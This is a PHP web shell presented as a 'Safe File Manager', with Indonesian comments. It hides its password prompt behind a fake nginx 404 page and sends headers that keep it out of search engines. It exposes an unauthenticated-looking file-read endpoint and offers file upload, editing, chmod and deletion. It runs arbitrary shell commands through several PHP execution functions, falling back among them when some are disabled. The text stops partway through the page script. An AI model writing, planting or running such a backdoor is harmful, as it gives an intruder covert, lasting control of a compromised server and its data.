<?php
/*
  Pernah waras — Safe File Manager (single-file) + 404 Password Protection
  (Sistem autentikasi diambil dari Leuser Manager yang sudah works)
*/

/* ----------------- POLYFILLS / BACKWARDS COMPAT ----------------- */
if (!function_exists('session_status')) {
    if (!defined('PHP_SESSION_ACTIVE')) define('PHP_SESSION_ACTIVE', 2);
    if (!defined('PHP_SESSION_NONE')) define('PHP_SESSION_NONE', 1);
    function session_status() {
        return session_id() === '' ? PHP_SESSION_NONE : PHP_SESSION_ACTIVE;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($len) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $b = openssl_random_pseudo_bytes($len);
            if ($b !== false && strlen($b) === $len) return $b;
        }
        $out = '';
        for ($i = 0; $i < $len; $i++) $out .= chr(mt_rand(0,255));
        return $out;
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($known_string, $user_string) {
        if (!is_string($known_string) || !is_string($user_string)) return false;
        $len1 = strlen($known_string);
        $len2 = strlen($user_string);
        if ($len1 !== $len2) return false;
        $res = 0;
        for ($i = 0; $i < $len1; $i++) {
            $res |= ord($known_string[$i]) ^ ord($user_string[$i]);
        }
        return $res === 0;
    }
}

if (!function_exists('header_remove')) {
    function header_remove($name = null) { return; }
}

function safe_base64_decode($data) {
    if (!is_string($data)) return false;
    if (function_exists('base64_decode') && version_compare(PHP_VERSION, '5.2.0', '>=')) {
        $decoded = base64_decode($data, true);
        if ($decoded !== false) return $decoded;
        $maybe = base64_decode($data);
        if ($maybe === false) return false;
        if (base64_encode($maybe) === str_replace(array("\r","\n"),'', $data)) return $maybe;
        return false;
    } else {
        $maybe = base64_decode($data);
        return $maybe === false ? false : $maybe;
    }
}

/* ============================================================
   ================ SISTEM AUTENTIKASI (dari Leuser Manager) ===
   ============================================================ */
$ADMIN_HASH = '$2y$10$W3CtskR6jj2FmLsW7kc24uud2en9sqiN4xinFasRPtNxy.E940/Jm'; // default: "password"

// Mulai session (kompatibel semua PHP)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Proses login jika ada POST
if (isset($_POST['login_submit'])) {
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    if (password_verify($password, $ADMIN_HASH)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        // Redirect agar POST tidak terkirim ulang
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Password salah!';
        usleep(500000);
    }
}

// Fungsi untuk menampilkan form login (gaya 404)
function show_login_form($error = '') {
    ?>
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>

<!-- Form login tersembunyi -->
<div style="position:fixed; bottom:0; right:0; opacity:0; pointer-events:none; z-index:-1;">
    <form method="post" autocomplete="off">
        <input type="password" name="password" placeholder="Enter password" required style="width:1px;height:1px;border:none;padding:0;margin:0;opacity:0;">
        <input type="hidden" name="login_submit" value="1">
        <button type="submit" style="width:1px;height:1px;border:none;padding:0;margin:0;opacity:0;">Login</button>
    </form>
</div>

<?php if (!empty($error)): ?>
    <div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px 30px; border-radius:8px; border:2px solid #f5c6cb; box-shadow:0 4px 20px rgba(0,0,0,0.2); font-family:system-ui; z-index:1000; text-align:center;">
        ❌ <?php echo htmlspecialchars($error); ?>
    </div>
<?php endif; ?>

<script>
    document.addEventListener('dblclick', function() {
        const pwd = document.querySelector('input[type="password"]');
        if (pwd) pwd.focus();
    });
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            const pwd = document.querySelector('input[type="password"]');
            if (pwd && document.activeElement === pwd) {
                pwd.form.submit();
            }
        }
    });
</script>
</body>
</html>
    <?php
    exit;
}

// Cek apakah sudah login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    $error = isset($error) ? $error : '';
    show_login_form($error);
}

// Logout handler
if (isset($_GET['logout'])) {
    unset($_SESSION['logged_in']);
    unset($_SESSION['login_time']);
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

/* ============================================================
   ================ AKHIR SISTEM AUTENTIKASI ===================
   ============================================================ */

/* ----------------- SISANYA ADALAH FILE MANAGER PERNAH WARAS (TIDAK DIUBAH) ----------------- */

/* --------------- ENV / STABILIZER --------------- */
@header_remove();
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
header('Referrer-Policy: no-referrer', true);
header('X-Frame-Options: DENY', true);
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0', true);
header('Pragma: no-cache', true);
header('Expires: 0', true);
header('Content-Type: text/html; charset=UTF-8', true);
header('X-Content-Type-Options: nosniff', true);
header('X-XSS-Protection: 1; mode=block', true);
header('Strict-Transport-Security: max-age=63072000; includeSubDomains; preload', true);

/* ----------------- CSRF UNTUK FILE MANAGER (tidak diubah) ----------------- */
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

function csrf_input() {
    echo '<input type="hidden" name="csrf" value="' . htmlspecialchars($_SESSION['csrf_token']) . '">';
}

function ensure_csrf() {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $tok = isset($_POST['csrf']) ? (string)$_POST['csrf'] : '';
        $sess = isset($_SESSION['csrf_token']) ? (string)$_SESSION['csrf_token'] : '';
        if (!hash_equals($sess, $tok)) {
            http_response_code(400);
            exit('CSRF token invalid');
        }
    }
}

/* ----------------- UTIL & SAFE HELPERS (tidak diubah) ----------------- */
function is_fn_usable($fn) {
    if (!function_exists($fn)) return false;
    $disabled = (string) @ini_get('disable_functions');
    $suhosin = (string) @ini_get('suhosin.executor.func.blacklist');
    $blocked = array();
    if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
    if ($suhosin !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
    if (!empty($blocked)) {
        $blocked = array_map('strtolower', array_filter($blocked));
        return !in_array(strtolower($fn), $blocked, true);
    }
    return true;
}

function strToHex($s){ $h=''; for($i=0;$i<strlen($s);$i++) $h.=sprintf("%02x",ord($s[$i])); return $h; }
function hexToStr($h){ $s=''; for($i=0;$i<strlen($h);$i+=2) $s.=chr(hexdec($h[$i].$h[$i+1])); return $s; }
function formatSize($s){ $u=array('B','KB','MB','GB','TB'); $i=0; while($s>=1024&&$i<4){ $s/=1024; $i++; } return round($s,2).' '.$u[$i]; }
function getFileDetails($p){ $f=array(); $d=array(); $i=@scandir($p); if(!is_array($i)) return array(); foreach($i as $it){ if($it=='.'||$it=='..') continue; $fp=rtrim($p,'/').'/'.$it; $det=array('name'=>$it,'type'=>is_dir($fp)?'Folder':'File','size'=>is_dir($fp)?'':formatSize(@filesize($fp)),'permission'=>@substr(sprintf('%o',@fileperms($fp)),-4)); if(is_dir($fp)) $d[]=$det; else $f[]=$det; } return array_merge($d,$f); }
function changeDirectory($p){ $p==='..'?@chdir('..'):@chdir($p); }
function getCurrentDirectory(){ $rp = realpath(getcwd()); return $rp ? $rp : getcwd(); }
function getLink($p,$n){ return is_dir($p) ? '<a href="?dir='.urlencode(strToHex($p)).'">'.htmlspecialchars($n).'</a>' : '<a href="#" onclick="openEditModalHex(\''.urlencode(strToHex($p)).'\'); return false;">'.htmlspecialchars($n).'</a>'; }
function showBreadcrumb($p){ $p=str_replace('\\','/',$p); $paths=explode('/',$p); echo'<div class="breadcrumb"><a href="?dir='.urlencode(strToHex('/')).'">/</a>'; $acc=''; foreach($paths as $pa){ if($pa==='') continue; $acc.='/'.$pa; echo'<a href="?dir='.urlencode(strToHex($acc)).'">'.htmlspecialchars($pa).'</a>/'; } echo'</div>'; }

function create_nonzero_file($path,$userContent=null){
    $default="Created by Pernah Waras safe manager @ ".date('c')."\n";
    $payload = ($userContent !== null && $userContent !== '') ? $userContent : $default;
    if (@file_put_contents($path,$payload,LOCK_EX) > 0) return array(true,'file_put_contents');
    if ($fp=@fopen($path,'wb')){ $w=@fwrite($fp,$payload); @fclose($fp); if($w>0) return array(true,'fopen+fwrite'); }
    if ($tmp=@tempnam(sys_get_temp_dir(),'asli_')){ @file_put_contents($tmp,$payload); if(@rename($tmp,$path)||@copy($tmp,$path)){ @unlink($tmp); if(@filesize($path)>0) return array(true,'tempnam+rename/copy'); } @unlink($tmp); }
    if ($src=@fopen('php://temp','wb+')){ @fwrite($src,$payload); @rewind($src); if($dst=@fopen($path,'wb')){ $copied=@stream_copy_to_stream($src,$dst); @fclose($dst); if($copied>0){ @fclose($src); return array(true,'php://temp copy'); } } @fclose($src); }
    if (@touch($path) && @file_put_contents($path,$payload,FILE_APPEND) > 0) return array(true,'touch+append');
    return array(false,'All methods failed');
}

/* ----------------- SAFE SYSTEM WRAPPERS (fx_*) ----------------- */
if (!function_exists('fx_proc_open')) {
    function fx_proc_open($cmd, $des, &$pipes, $cwd=null, $env=null){
        if (!is_fn_usable('proc_open')) return false;
        return @proc_open($cmd, $des, $pipes, $cwd, $env);
    }
}
if (!function_exists('fx_shell_exec')) {
    function fx_shell_exec($cmd){
        if (!is_fn_usable('shell_exec')) return null;
        return @shell_exec($cmd);
    }
}
if (!function_exists('fx_exec')) {
    function fx_exec($cmd, &$out=null, &$code=null){
        if (!is_fn_usable('exec')) { $out = array(); $code = 127; return null; }
        @exec($cmd, $out, $code);
        return $out;
    }
}
if (!function_exists('fx_system')) {
    function fx_system($cmd, &$code=null){
        if (!is_fn_usable('system')) { $code = 127; return null; }
        ob_start(); @system($cmd, $code); $o = ob_get_clean();
        return $o;
    }
}
if (!function_exists('fx_popen')) {
    function fx_popen($cmd, $mode){
        if (!is_fn_usable('popen')) return false;
        return @popen($cmd, $mode);
    }
}

if (!function_exists('run_command_all')) {
    function run_with_proc_open($cmd,$cwd=null,$timeout=30){
        if (!is_fn_usable('proc_open')) return null;
        $des = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $pipes = array();
        $proc = @proc_open($cmd,$des,$pipes,$cwd?:null,null);
        if (!is_resource($proc)) return null;
        @stream_set_blocking($pipes[1], false);
        @stream_set_blocking($pipes[2], false);
        @fclose($pipes[0]);
        $buf=''; $start=time();
        while(true){
            $status = @proc_get_status($proc);
            $running = $status && !empty($status['running']);
            $r = array();
            if (isset($pipes[1]) && is_resource($pipes[1])) $r[] = $pipes[1];
            if (isset($pipes[2]) && is_resource($pipes[2])) $r[] = $pipes[2];
            if ($r){
                $w = $e = null;
                @stream_select($r,$w,$e,1);
                foreach($r as $p){ $chunk = @fread($p,8192); if ($chunk !== false && $chunk !== '') $buf .= $chunk; }
            } else {
                usleep(100000);
            }
            if (!$running) break;
            if ($timeout>0 && (time()-$start) >= $timeout){
                @proc_terminate($proc, 9);
                foreach ($pipes as $p) if (is_resource($p)) @fclose($p);
                @proc_close($proc);
                return array('method'=>'proc_open','code'=>124,'out'=>$buf."\n[timeout after {$timeout}s]");
            }
        }
        foreach ($pipes as $p) if (is_resource($p)) @fclose($p);
        $code = @proc_close($proc); if ($code === -1) $code = null;
        return array('method'=>'proc_open','code'=>$code,'out'=>$buf);
    }

    function run_with_shell_exec($cmd,$cwd=null){
        if (!is_fn_usable('shell_exec')) return null;
        $full = ($cwd ? "cd ".escapeshellarg($cwd)." && " : '') . $cmd . ' 2>&1';
        $out = @shell_exec($full);
        if ($out === null) return null;
        return array('method'=>'shell_exec','code'=>null,'out'=>$out);
    }

    function run_with_exec($cmd,$cwd=null){
        if (!is_fn_usable('exec')) return null;
        $full = ($cwd ? "cd ".escapeshellarg($cwd)." && " : '') . $cmd . ' 2>&1';
        $lines = array(); $code = 0; @exec($full,$lines,$code);
        return array('method'=>'exec','code'=>$code,'out'=>implode("\n",(array)$lines));
    }

    function run_with_system($cmd,$cwd=null){
        if (!is_fn_usable('system')) return null;
        $full = ($cwd ? "cd ".escapeshellarg($cwd)." && " : '') . $cmd . ' 2>&1';
        ob_start(); @system($full,$code); $out = ob_get_clean();
        return array('method'=>'system','code'=>$code,'out'=>$out);
    }

    function run_with_popen($cmd,$cwd=null){
        if (!is_fn_usable('popen')) return null;
        $full = ($cwd ? "cd ".escapeshellarg($cwd)." && " : '') . $cmd . ' 2>&1';
        $h = @popen($full,'r'); if (!is_resource($h)) return null;
        $buf = '';
        while (!feof($h)){ $chunk = @fread($h,8192); if ($chunk===false) break; $buf.=$chunk; }
        @pclose($h);
        return array('method'=>'popen','code'=>null,'out'=>$buf);
    }

    function run_command_all($cmd,$cwd=null){
        $po = run_with_proc_open($cmd,$cwd,30); if ($po) return $po;
        $order = array('run_with_shell_exec','run_with_exec','run_with_system','run_with_popen');
        foreach ($order as $fn){
            if (function_exists($fn)) {
                $res = $fn($cmd,$cwd);
                if ($res) return $res;
            }
        }
        return array('method'=>'none','code'=>127,'out'=>"Command runner not available on this PHP build.");
    }
}

/* ----------------- REQUEST HANDLING (tidak diubah) ----------------- */

$curDir = getCurrentDirectory();
$msg = ''; $cmdOutput = '';

// GET helpers
if (isset($_GET['get_filename'])) { echo basename(hexToStr($_GET['get_filename'])); exit; }
if (isset($_GET['ambil-lc-cok'])) { $f = hexToStr($_GET['ambil-lc-cok']); if (file_exists($f)) echo @file_get_contents($f); exit; }
if (isset($_GET['dir'])) { changeDirectory(hexToStr($_GET['dir'])); $curDir = getCurrentDirectory(); }

// POST actions — protect with CSRF (tidak diubah)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ensure_csrf();
    // create folder
    if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
        $nf = $curDir . '/' . basename($_POST['folder_name']);
        if (!file_exists($nf)) @mkdir($nf,0755,true);
        $msg = 'Folder created.';
    }
    // create file
    if (isset($_POST['new_file']) && !empty($_POST['file_name'])) {
        $fp = $curDir . '/' . basename($_POST['file_name']);
        $file_content = isset($_POST['file_content']) ? $_POST['file_content'] : null;
        list($s,$m) = create_nonzero_file($fp, $file_content);
        $msg = $s ? "File created using $m." : "Failed to create file.";
    }
    // upload
    if (isset($_POST['upload_file']) && isset($_FILES['uploaded_file'])) {
        $targetPath = $curDir . '/' . basename($_FILES['uploaded_file']['name']);
        $tmpFile = $_FILES['uploaded_file']['tmp_name'];
        if (is_uploaded_file($tmpFile) && @filesize($tmpFile) > 0) {
            if (@move_uploaded_file($tmpFile, $targetPath)) {
                $msg = 'File uploaded successfully (move_uploaded_file).';
            } else {
                $content = @file_get_contents($tmpFile);
                list($success,$method) = create_nonzero_file($targetPath, $content);
                $msg = $success ? "File uploaded using fallback ($method)." : "Upload failed (fallback failed).";
            }
        } else {
            list($success,$method) = create_nonzero_file($targetPath, "Upload placeholder @ ".date('c'));
            $msg = $success ? "Empty upload handled, file created using $method." : "Upload failed (empty file).";
        }
    }
    // edit/save
    if (isset($_POST['edit_file'])) {
        $f = hexToStr($_POST['edit_file']);
        if (file_exists($f) && is_writable($f)) {
            $c = isset($_POST['content']) ? $_POST['content'] : '';
            if (isset($_POST['mode']) && $_POST['mode'] === 'b64') {
                $dec = safe_base64_decode($c);
                if ($dec === false) { $msg = 'Save failed: invalid Base64 data'; }
                else { list($success,$method) = create_nonzero_file($f, $dec); $msg = $success ? "File edited using $method." : "Failed to edit file."; }
            } else {
                list($success,$method) = create_nonzero_file($f, $c);
                $msg = $success ? "File edited using $method." : "Failed to edit file.";
            }
        } else {
            $msg = 'Save failed (file not writable or missing).';
        }
    }
    // rename
    if (isset($_POST['rename_path']) && !empty($_POST['new_name'])) {
        $old = hexToStr($_POST['rename_path']); $new = basename($_POST['new_name']);
        if ($old && $new && file_exists($old)) @rename($old, dirname($old).'/'.$new);
        $msg = 'Renamed.';
    }
    // chmod
    if (isset($_POST['chmod_path']) && !empty($_POST['chmod_value'])) {
        $path = hexToStr($_POST['chmod_path']);
        $perm = intval($_POST['chmod_value'],8);
        if (file_exists($path)) @chmod($path, $perm);
        $msg = 'Permission changed.';
    }
    // delete
    if (isset($_POST['delete_path'])) {
        $f = hexToStr($_POST['delete_path']);
        if (is_file($f)) @unlink($f);
        elseif (is_dir($f)) {
            $fs = @glob($f.'/*');
            if (is_array($fs)) {
                foreach($fs as $fi) is_dir($fi) ? @rmdir($fi) : @unlink($fi);
            }
            @rmdir($f);
        }
        $msg = 'Deleted.';
    }
    // command (execute)
    if (isset($_POST['cmd']) && !empty(trim((string)$_POST['cmd']))) {
        $c = trim((string)$_POST['cmd']);
        $c = preg_replace('/[^\x20-\x7E]/', '', $c);
        try {
            $result = run_command_all($c, $curDir);
            $cmdOutput = is_array($result) && isset($result['out']) ? $result['out'] : (string)$result;
        } catch (Exception $e) {
            $cmdOutput = 'Error: '.$e->getMessage();
        }
    }
}

/* ----------------- HTML / UI (tidak diubah) ----------------- */
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Pernah Waras — Safe File Manager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
/* --- STYLE ASLI (tidak diubah, hanya ditambah di bawah) --- */
body{font-family:system-ui,Segoe UI,Arial; margin:18px; background:#f7fafc; color:#222}
h1{margin:0 0 12px}
.breadcrumb a{color:#1f6feb;text-decoration:none;margin-right:6px}
.toolbar{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:14px}
.toolbar form{background:#fff;padding:8px;border-radius:8px;border:1px solid #e6e6e6}
input[type=text],textarea,input[type=file]{padding:8px;border:1px solid #d1d5db;border-radius:6px}
button.button{background:#0ea5e9;color:#fff;border:0;padding:8px 12px;border-radius:6px;cursor:pointer}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden}
th,td{padding:10px;text-align:left}
th{background:#0ea5e9;color:#fff}
tr:nth-child(even){background:#f3f4f6}
.modal{display:none}
#notification{display:none;padding:10px;background:#059669;color:#fff;border-radius:6px;position:fixed;top:18px;right:18px}
pre.cmdout{background:#fff;padding:10px;border-radius:8px;border:1px solid #e6e6e6;max-height:280px;overflow:auto}
.modal {
    display:none;
    position:fixed;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    background:#fff;
    padding:20px;
    border:1px solid #ccc;
    border-radius:8px;
    z-index:9999;
    width:88%;
    max-width:880px;
    box-shadow:0 8px 30px rgba(0,0,0,0.3);
}
.modal h3{margin-top:0}
.modal .modal-controls{display:flex;gap:8px;margin-top:10px;align-items:center}
.overlay {
    display:none;
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.45);
    z-index:9998;
}
.logout-link {
    float: right;
    color: #dc2626;
    text-decoration: none;
    font-size: 14px;
    margin-top: 5px;
}
.logout-link:hover {
    text-decoration: underline;
}

/* ===== TAMBAHAN CSS UNTUK DARK MODE & NEON GLOWING ===== */
/* Tombol toggle */
#darkModeToggle {
    background: transparent;
    border: none;
    font-size: 1.6rem;
    cursor: pointer;
    margin-left: 10px;
    vertical-align: middle;
    color: #333;
    transition: all 0.3s ease;
}
#darkModeToggle:hover {
    transform: scale(1.1);
}

/* Dark mode base */
body.dark-mode {
    background-color: #0a0a0a !important;
    color: #e0e0e0 !important;
}

/* Neon glow pada teks utama */
body.dark-mode h1,
body.dark-mode .breadcrumb a,
body.dark-mode .logout-link {
    color: #00ffff;
    text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 40px #00ffff;
    transition: text-shadow 0.3s;
}
body.dark-mode .breadcrumb a:hover,
body.dark-mode .logout-link:hover {
    color: #ff00ff;
    text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff;
}

/* Tabel dengan border & bayangan neon */
body.dark-mode table {
    background: #1a1a1a;
    border: 1px solid #00ffff;
    box-shadow: 0 0 20px #00ffff, inset 0 0 10px #00ffff;
}
body.dark-mode th {
    background: #003366;
    color: #00ffff;
    text-shadow: 0 0 8px #00ffff;
}
body.dark-mode tr:nth-child(even) {
    background: #1f1f1f;
}
/* Efek glowing pada baris saat hover (cursor berada di baris) */
body.dark-mode tr:hover td {
    background: #003333 !important;
    box-shadow: inset 0 0 30px #00ffff, 0 0 15px #00ffff;
    color: #ffffff;
    text-shadow: 0 0 10px #00ffff;
    transition: all 0.2s ease;
}
body.dark-mode td,
body.dark-mode th {
    border-bottom: 1px solid #00ffff;
}

/* Toolbar, input, textarea, select */
body.dark-mode .toolbar form {
    background: #1a1a1a;
    border-color: #00ffff;
    box-shadow: 0 0 10px rgba(0,255,255,0.3);
}
body.dark-mode input[type=text],
body.dark-mode textarea,
body.dark-mode input[type=file],
body.dark-mode select {
    background: #2a2a2a;
    color: #e0e0e0;
    border-color: #00ffff;
}
body.dark-mode input[type=text]:focus,
body.dark-mode textarea:focus {
    box-shadow: 0 0 15px #00ffff;
    border-color: #00ffff;
}

/* Tombol */
body.dark-mode .button {
    background: #003366;
    color: #00ffff;
    box-shadow: 0 0 15px #00ffff;
}
body.dark-mode .button:hover {
    background: #0055aa;
    box-shadow: 0 0 30px #00ffff;
}

/* Modal */
body.dark-mode .modal {
    background: #1a1a1a;
    border: 2px solid #00ffff;
    box-shadow: 0 0 40px #00ffff;
}
body.dark-mode .modal h3 {
    color: #00ffff;
    text-shadow: 0 0 10px #00ffff;
}
body.dark-mode .modal .button {
    background: #003366;
    color: #00ffff;
}
body.dark-mode .modal .button[style*="background:#6b7280"] {
    background: #444 !important;
    color: #ccc;
}
body.dark-mode .modal .button[style*="background:#dc2626"] {
    background: #660000 !important;
    color: #ff6666;
    box-shadow: 0 0 15px #ff0000;
}

/* Command output */
body.dark-mode pre.cmdout {
    background: #1a1a1a;
    border-color: #00ff00;
    color: #00ff00;
    text-shadow: 0 0 8px #00ff00;
    box-shadow: 0 0 20px #00ff00;
}

/* Notifikasi */
body.dark-mode #notification {
    background: #003300;
    color: #00ff00;
    box-shadow: 0 0 20px #00ff00;
}

/* Logout link */
body.dark-mode .logout-link {
    color: #ff00ff;
}
body.dark-mode .logout-link:hover {
    color: #ff00ff;
    text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff;
}

/* Tombol toggle saat dark */
body.dark-mode #darkModeToggle {
    color: #00ffff;
    text-shadow: 0 0 15px #00ffff;
}

/* About Me */
body.dark-mode .about-me a {
    color: #00ffff !important;
    text-shadow: 0 0 10px #00ffff;
}
body.dark-mode .about-me a:hover {
    color: #ff00ff !important;
    text-shadow: 0 0 20px #ff00ff;
}
</style>
</head>
<body>
<h1>
    Pernah Waras — Safe File Manager
    <button id="darkModeToggle" aria-label="Toggle dark mode">🌙</button>
    <a href="?logout" class="logout-link">Logout</a>
</h1>
<?php if ($msg) echo '<div id="notification">'.htmlspecialchars($msg).'</div>'; ?>
<?php showBreadcrumb($curDir); ?>

<div class="toolbar">
<form method="get">
    <button type="submit" class="button">Home</button>
</form>

<form method="post">
    <?php csrf_input(); ?>
    <input type="text" name="folder_name" placeholder="New Folder Name">
    <button type="submit" name="new_folder" class="button">Create Folder</button>
</form>

<form method="post">
    <?php csrf_input(); ?>
    <input type="text" name="file_name" placeholder="New File Name">
    <textarea name="file_content" rows="2" placeholder="Optional initial content"></textarea>
    <button type="submit" name="new_file" class="button">Create File</button>
</form>

<form method="post" enctype="multipart/form-data">
    <?php csrf_input(); ?>
    <input type="file" name="uploaded_file" required>
    <button type="submit" name="upload_file" class="button">Upload</button>
</form>

<form method="post">
    <?php csrf_input(); ?>
    <input type="text" name="cmd" placeholder="Enter command">
    <button type="submit" class="button">Execute</button>
</form>
</div>

<?php if ($cmdOutput): ?>
    <pre class="cmdout"><?php echo htmlspecialchars($cmdOutput); ?></pre>
<?php endif; ?>

<table>
<thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Permission</th><th>Actions</th></tr></thead>
<tbody>
<?php foreach (getFileDetails($curDir) as $f): 
    $full = $curDir . '/' . $f['name'];
?>
<tr>
    <td><?php echo getLink($full, $f['name']); ?></td>
    <td><?php echo htmlspecialchars($f['type']); ?></td>
    <td><?php echo htmlspecialchars($f['size']); ?></td>
    <td><?php echo htmlspecialchars($f['permission']); ?></td>
    <td>
        <a href="#" onclick="openEditModalHex('<?php echo urlencode(strToHex($full)); ?>'); return false;">Edit</a> |
        <a href="#" onclick="openRenameModal('<?php echo urlencode(strToHex($full)); ?>'); return false;">Rename</a> |
        <a href="#" onclick="openChmodModal('<?php echo urlencode(strToHex($full)); ?>'); return false;">Chmod</a> |
        <a href="#" onclick="openDeleteModal('<?php echo urlencode(strToHex($full)); ?>'); return false;">Delete</a>
    </td>
</tr>
<?php endforeach; ?>
</tbody>
</table>

<div id="overlay" class="overlay" onclick="closeAllModals()"></div>

<!-- EDIT MODAL -->
<div id="editModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="editTitle">
  <h3 id="editTitle">Edit File: <span id="modal-filename"></span></h3>
  <form method="post" id="editForm">
    <?php csrf_input(); ?>
    <input type="hidden" name="edit_file" id="modal-filepath">
    <label>Mode: </label>
    <select id="modal-mode" name="mode">
      <option value="">Text</option>
      <option value="b64">Base64</option>
    </select>
    <div style="margin-top:10px;">
      <textarea name="content" id="modal-textarea" rows="18" style="width:100%;font-family:monospace;"></textarea>
    </div>
    <div class="modal-controls">
      <button type="submit" class="button">Save</button>
      <button type="button" onclick="closeEditModal()" class="button" style="background:#6b7280;">Cancel</button>
      <span style="margin-left:auto;font-size:0.9em;color:#555">Tip: gunakan Base64 jika file biner</span>
    </div>
  </form>
</div>

<!-- RENAME -->
<div id="renameModal" class="modal">
  <h3>Rename</h3>
  <form method="post">
    <?php csrf_input(); ?>
    <input type="hidden" name="rename_path" id="rename-path">
    <input type="text" name="new_name" id="rename-input" placeholder="New Name">
    <div class="modal-controls">
      <button type="submit" class="button">Rename</button>
      <button type="button" onclick="closeRenameModal()" class="button" style="background:#6b7280;">Cancel</button>
    </div>
  </form>
</div>

<!-- CHMOD -->
<div id="chmodModal" class="modal">
  <h3>Change Permission</h3>
  <form method="post">
    <?php csrf_input(); ?>
    <input type="hidden" name="chmod_path" id="chmod-path">
    <input type="text" name="chmod_value" id="chmod-input" placeholder="e.g., 0755">
    <div class="modal-controls">
      <button type="submit" class="button">Change</button>
      <button type="button" onclick="closeChmodModal()" class="button" style="background:#6b7280;">Cancel</button>
    </div>
  </form>
</div>

<!-- DELETE -->
<div id="deleteModal" class="modal">
  <h3>Delete</h3>
  <form method="post">
    <?php csrf_input(); ?>
    <input type="hidden" name="delete_path" id="delete-path">
    <div class="modal-controls">
      <button type="submit" class="button" style="background:#dc2626;">Delete</button>
      <button type="button" onclick="closeDeleteModal()" class="button" style="background:#6b7280;">Cancel</button>
    </div>
  </form>
</div>

<script>
function showNotification(msg){
    var n=document.getElementById('notification');
    if(!n){
        n=document.createElement('div'); n.id='notification'; n.style.cssText='display:block;padding:10px;background:#059669;color:#fff;border-radius:6px;position:fixed;top:18px;right:18px;';
        document.body.appendChild(n);
    }
    n.innerText=msg;
    n.style.display='block';
    setTimeout(function(){ n.style.display='none'; },3000);
}
<?php if ($msg) echo "showNotification(".json_encode($msg).");"; ?>

var overlay = document.getElementById('overlay');
var editModal = document.getElementById('editModal');
var modalTextarea = document.getElementById('modal-textarea');
var modalMode = document.getElementById('modal-mode');
var modalFilepath = document.getElementById('modal-filepath');
var modalFilename = document.getElementById('modal-filename');
var renameModal = document.getElementById('renameModal');
var chmodModal = document.getElementById('chmodModal');
var deleteModal = document.getElementById('deleteModal');

function openOverlay(){ overlay.style.display='block'; }
function closeOverlay(){ overlay.style.display='none'; }

function openEditModalHex(hexPath){
    openOverlay();
    editModal.style.display='block';
    modalFilepath.value = hexPath;
    fetch('?get_filename='+hexPath)
        .then(function(r){ return r.text(); })
        .then(function(fn){
            modalFilename.innerText = fn;
        })
        .catch(function(){ modalFilename.innerText = '[Unknown]'; });
    fetch('?ambil-lc-cok='+hexPath)
        .then(function(r){ return r.text(); })
        .then(function(content){
            modalTextarea.value = content;
            modalMode.value = '';
        })
        .catch(function(){
            modalTextarea.value = '[Gagal membaca file — mungkin permission atau file tidak ada]';
            modalMode.value = '';
        });
    setTimeout(function(){ try{ modalTextarea.focus(); }catch(e){} },150);
}

function closeEditModal(){
    editModal.style.display='none';
    closeOverlay();
}

function openRenameModal(path){
    openOverlay();
    document.getElementById('rename-path').value = path;
    fetch('?get_filename=' + path).then(function(r){ return r.text(); }).then(function(fn){ document.getElementById('rename-input').placeholder = fn; }).catch(function(){});
    renameModal.style.display='block';
}
function closeRenameModal(){ renameModal.style.display='none'; closeOverlay(); }

function openChmodModal(path){
    openOverlay();
    document.getElementById('chmod-path').value = path;
    fetch('?get_filename=' + path).then(function(r){ return r.text(); }).then(function(fn){ document.getElementById('chmod-input').placeholder = fn; }).catch(function(){});
    chmodModal.style.display='block';
}
function closeChmodModal(){ chmodModal.style.display='none'; closeOverlay(); }

function openDeleteModal(path){
    openOverlay();
    document.getElementById('delete-path').value = path;
    deleteModal.style.display='block';
}
function closeDeleteModal(){ deleteModal.style.display='none'; closeOverlay(); }

function closeAllModals(){
    closeEditModal();
    closeRenameModal();
    closeChmodModal();
    closeDeleteModal();
}

if (modalMode) {
    try {
        modalMode.addEventListener('change', function(){
            var val = modalTextarea.value || '';
            if (!val) return;
            try {
                if (modalMode.value === 'b64') {
                    modalTextarea.value = btoa(unescape(encodeURIComponent(val)));
                } else {
                    modalTextarea.value = decodeURIComponent(escape(atob(val)));
                }
            } catch(e){
                alert('Base64 conversion error: ' + (e.message || 'invalid input'));
            }
        });
    } catch(e){}
}

document.addEventListener('keydown', function(e){
    if (e.key === 'Escape') closeAllModals();
});

// ===== TAMBAHAN JAVASCRIPT UNTUK TOGGLE DARK/LIGHT MODE =====
(function() {
    const toggleBtn = document.getElementById('darkModeToggle');
    if (!toggleBtn) return;

